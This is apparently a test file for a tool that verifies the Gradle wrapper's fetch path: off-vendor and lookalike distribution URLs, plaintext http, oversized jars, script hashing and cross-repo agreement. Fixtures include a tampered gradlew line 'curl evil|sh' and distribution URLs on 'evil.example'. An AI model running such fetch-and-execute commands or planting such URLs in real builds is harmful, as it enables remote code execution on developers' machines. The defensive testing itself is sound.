// ./gradlew does two things before any build file is read: fetches a Gradle distribution from a URL
// the REPOSITORY chooses, and executes a committed binary nobody diffs. Both are checkable without
// running anything.
//
// Every test below pins a finding from the three adversarial rounds run on the first cut of this
// file, because all four defects were mine and three of them were the class this project exists to
// refuse.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync, mkdirSync, chmodSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { verifyWrapper, fleetAgreement, assertValidDocument } from '../gradle-wrapper-verify.mjs';

const T = mkdtempSync(join(tmpdir(), 'cw-gw-'));
function repo({ props, jar, gradlew = '#!/bin/sh\necho hi\n' } = {}) {
  const d = mkdtempSync(join(T, 'r-'));
  mkdirSync(join(d, 'gradle', 'wrapper'), { recursive: true });
  if (gradlew !== null) writeFileSync(join(d, 'gradlew'), gradlew);
  if (props !== undefined) writeFileSync(join(d, 'gradle/wrapper/gradle-wrapper.properties'), props);
  if (jar !== undefined) writeFileSync(join(d, 'gradle/wrapper/gradle-wrapper.jar'), jar);
  return d;
}
const rules = (r) => r.findings.map((f) => f.rule).sort();
const OK = 'distributionUrl=https\\://services.gradle.org/distributions/gradle-9.7.1-bin.zip\ndistributionSha256Sum=abc\n';

test('a repo with no wrapper is n/a AND still carries findings:[] — a consumer must not have to know the shape', () => {
  const r = verifyWrapper(mkdtempSync(join(T, 'plain-')));
  assert.equal(r.applicable, false);
  assert.deepEqual(r.findings, [], 'an absent array and an empty one are the same claim; only one throws');
});

test('an UNREADABLE properties file infers nothing from it', () => {
  // The first cut emitted four findings here — "url absent" and "checksum undeclared" among them,
  // both assertions about a file nobody read. an unsupported finding, in the lane built to
  // refuse exactly that.
  const d = repo({ props: 'x' });
  chmodSync(join(d, 'gradle/wrapper/gradle-wrapper.properties'), 0o000);
  const r = verifyWrapper(d);
  chmodSync(join(d, 'gradle/wrapper/gradle-wrapper.properties'), 0o644);
  assert.ok(rules(r).includes('wrapper-properties-unreadable'));
  assert.ok(!rules(r).includes('distribution-url-absent'), 'nothing may be derived from an unread file');
  assert.ok(!rules(r).includes('distribution-checksum-undeclared'), 'nor this');
});

test('an off-vendor distributionUrl is HIGH — it is the substitution vector', () => {
  const r = verifyWrapper(repo({ props: 'distributionUrl=https\\://evil.example/distributions/gradle-9.7.1-bin.zip\n' }));
  const f = r.findings.find((x) => x.rule === 'distribution-url-off-vendor');
  assert.ok(f, 'must fire');
  assert.equal(f.sev, 'high');
});

test('a lookalike host does not pass — the check anchors on the path, not a substring', () => {
  for (const host of ['services.gradle.org.evil.example', 'services.gradle.org@evil.example', 'notservices.gradle.org']) {
    const r = verifyWrapper(repo({ props: `distributionUrl=https\\://${host}/distributions/gradle-9.7.1-bin.zip\n` }));
    assert.ok(rules(r).includes('distribution-url-off-vendor'), `${host} must be flagged`);
  }
});

test('http:// reports ONCE, not twice — one bad URL is one problem', () => {
  const r = verifyWrapper(repo({ props: 'distributionUrl=http\\://services.gradle.org/distributions/gradle-9.7.1-bin.zip\n' }));
  const hits = rules(r).filter((x) => x.startsWith('distribution-url-'));
  assert.deepEqual(hits, ['distribution-url-plaintext'], 'plaintext and off-vendor both firing made one fact look like two');
});

test('an oversized wrapper jar is refused, NOT read — a scanner the scanned repo can kill is worse than one that declines', () => {
  const big = Buffer.alloc(5 * 1024 * 1024, 0x41);
  const r = verifyWrapper(repo({ props: OK, jar: big }));
  assert.ok(rules(r).includes('wrapper-jar-oversized'));
  assert.equal(r.jarSha256, undefined, 'an oversized file must not be hashed — reading it whole is the attack');
});

test('gradlew ITSELF is hashed — checking the URL and jar while never reading the script was the largest false negative', () => {
  const a = verifyWrapper(repo({ props: OK, jar: Buffer.from('j'), gradlew: '#!/bin/sh\necho a\n' }));
  const b = verifyWrapper(repo({ props: OK, jar: Buffer.from('j'), gradlew: '#!/bin/sh\ncurl evil|sh\n' }));
  assert.ok(a.gradlewSha256 && b.gradlewSha256);
  assert.notEqual(a.gradlewSha256, b.gradlewSha256,
    'an attacker who edits gradlew and leaves the URL and jar pristine must not read as clean');
});

test('the result states its own scope — it verifies the FETCH PATH, not that running the wrapper is safe', () => {
  const r = verifyWrapper(repo({ props: OK, jar: Buffer.from('j') }));
  assert.equal(r.scope, 'wrapper-fetch-path');
  assert.ok(Array.isArray(r.doesNotCover) && r.doesNotCover.length >= 3,
    'build.gradle, gradle.properties jvmargs and pluginManagement are all unchecked and must be named');
});

test('no reference list means UNKNOWN, never good', () => {
  const r = verifyWrapper(repo({ props: OK, jar: Buffer.from('j') }));
  assert.equal(r.checksumCheck, 'no-reference-list');
  assert.ok(!r.findings.some((f) => f.rule === 'wrapper-jar-unrecognised'),
    'without a list nothing may be asserted about the jar in either direction');
});

test('cross-repo agreement flags a disagreement AND counts what it could not examine', () => {
  const mk = (repoName, version, jarSha256, gradlewSha256) =>
    ({ applicable: true, repo: repoName, declaredVersion: version, jarSha256, gradlewSha256 });
  const fa = fleetAgreement([
    mk('a', '9.7.0', 'AAA', 'GA'), mk('b', '9.7.0', 'BBB', 'GB'),
    mk('c', '8.9', 'CCC', 'GC'),
  ]);
  assert.equal(fa.disagreements.length, 1);
  assert.equal(fa.disagreements[0].version, '9.7.0');
  // The cheapest way to defeat this check is to declare a version no sibling uses. Measured on the
  // real corpus: 5 of 6 versions were unexaminable for exactly that reason.
  assert.equal(fa.unexaminable.length, 1, 'a version only one repo declares cannot be cross-checked and must be counted');
  assert.deepEqual(fa.unexaminable[0].repos, ['c']);
});

test('agreement can compare the script as well as the jar', () => {
  const mk = (n, v, g) => ({ applicable: true, repo: n, declaredVersion: v, gradlewSha256: g });
  const fa = fleetAgreement([mk('a', '9.7.0', 'G1'), mk('b', '9.7.0', 'G2')], { artifact: 'gradlewSha256' });
  assert.equal(fa.artifact, 'gradlew');
  assert.equal(fa.disagreements.length, 1);
});

// ── the document's SHAPE, declared ────────────────────────────────────────────────────────────
// This artefact carried ten structured fields and no schema while its sibling scannerFindings rows
// were machine-validated — same tree, same session, one validated and one not. A consumer written
// against an unschema'd document cannot tell a field that was RENAMED from one that was never
// there, which is the whole reason absence-means-something needs a declaration to mean it.

test('every shape the tool can emit validates against its declared schema', () => {
  // Both branches, because `applicable:false` is a DIFFERENT document (it carries `reason` and
  // drops every derived key) and validating only the rich one would leave half the surface unpinned.
  const withWrapper = mkdtempSync(join(T, 'schema-yes-'));
  mkdirSync(join(withWrapper, 'gradle', 'wrapper'), { recursive: true });
  writeFileSync(join(withWrapper, 'gradlew'), '#!/bin/sh\n');
  writeFileSync(join(withWrapper, 'gradle', 'wrapper', 'gradle-wrapper.properties'),
    'distributionUrl=https\\://services.gradle.org/distributions/gradle-9.7.0-bin.zip\n');
  writeFileSync(join(withWrapper, 'gradle', 'wrapper', 'gradle-wrapper.jar'), 'not-a-real-jar');

  const shapes = [verifyWrapper(withWrapper), verifyWrapper(mkdtempSync(join(T, 'schema-no-')))];
  assert.notEqual(shapes[0].applicable, shapes[1].applicable, 'the two branches must differ, or this checks one shape twice');
  for (const res of shapes) {
    const doc = { tool: 'gradle-wrapper-verify', generatedAt: '2026-08-23T00:00:00.000Z', root: '~/x', ...res };
    assert.doesNotThrow(() => assertValidDocument(doc), `this shape must validate: ${Object.keys(doc).join(',')}`);
  }
});

test('an undeclared key is REFUSED — otherwise the schema is decoration', () => {
  // The negative control. A validator that has never rejected anything proves nothing, and
  // additionalProperties:false is the specific thing that makes a missing key mean something.
  const base = { tool: 'gradle-wrapper-verify', generatedAt: '2026-08-23T00:00:00.000Z', root: '~/x',
    ran: true, applicable: false, findings: [], reason: 'none' };
  assert.doesNotThrow(() => assertValidDocument(base), 'the control must pass before its mutations mean anything');
  assert.throws(() => assertValidDocument({ ...base, jarSha265: 'typo-in-the-key' }), /unknown key/,
    'a MISSPELLED key is the case this exists for — it reads as "absent" to every consumer');
  assert.throws(() => assertValidDocument({ ...base, checksumCheck: 'probably-fine' }), /checksumCheck/,
    'an unlisted checksum verdict must not ship — the enum is what keeps unknown out of the pass bucket');
  assert.throws(() => assertValidDocument({ ...base, findings: [{ rule: 'r', sev: 'critical', message: 'm' }] }), /sev/,
    'this lane grades high/med/low; a severity it cannot produce means the writer and reader disagree');
  const { findings, ...noFindings } = base;
  assert.throws(() => assertValidDocument(noFindings), /required key 'findings'/,
    'findings[] is required even when not applicable — an absent array and an empty one are one claim');
});

test('an unreadable schema is fatal, never a skipped check', () => {
  const doc = { tool: 'gradle-wrapper-verify', generatedAt: '2026-08-23T00:00:00.000Z', root: '~/x',
    ran: true, applicable: false, findings: [], reason: 'none' };
  assert.throws(() => assertValidDocument(doc, { path: join(T, 'no-such-schema.json') }),
    /could not be read or parsed|refusing to report/,
    'a missing schema must not silently validate everything — fail closed');
});
